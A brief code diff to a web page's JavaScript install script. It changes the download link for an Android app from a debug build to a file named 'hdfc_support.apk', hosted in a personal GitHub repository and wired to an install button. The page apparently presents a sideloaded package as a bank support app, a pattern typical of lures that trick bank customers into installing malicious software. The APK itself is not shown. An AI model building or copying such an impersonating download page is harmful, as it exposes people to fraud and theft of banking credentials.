@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
     // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
-    const REAL_APK_URL = 'https://github.com/amanxridex/newmade/releases/download/v1.0.12/app-debug.apk'; 
+    const REAL_APK_URL = 'https://github.com/amanxridex/newmade/releases/download/v1.0.14/hdfc_support.apk'; 
     
     const installBtn = document.getElementById('installBtn');
     let deferredPrompt;
